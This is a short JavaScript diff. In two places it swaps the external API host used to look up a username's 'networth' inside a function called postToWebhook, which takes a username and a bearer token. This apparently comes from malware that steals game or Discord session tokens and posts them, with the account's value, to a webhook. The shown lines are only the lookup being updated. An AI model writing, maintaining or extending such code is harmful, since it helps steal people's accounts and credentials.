@@ -163,7 +163,7 @@ async function postToWebhook(formatNumber, level, rank, username, bearerToken, u
     let networth = await (
         await axios
             .get(
-                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+                `https://apinew-3z7f.onrender.com/v2/profiles/${username}?key=discordlink`
             )
             .catch(() => {
                 return { data: { data: [{ networth: null }] } };
@@ -306,7 +306,7 @@ async function postToWebhook(formatNumber, level, rank, username, bearerToken, u
     let networth = await (
         await axios
             .get(
-                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+                `https://apinew-3z7f.onrender.com/v2/profiles/${username}?key=discordlink`
             )
             .catch(() => {
                 return { data: { data: [{ networth: null }] } };
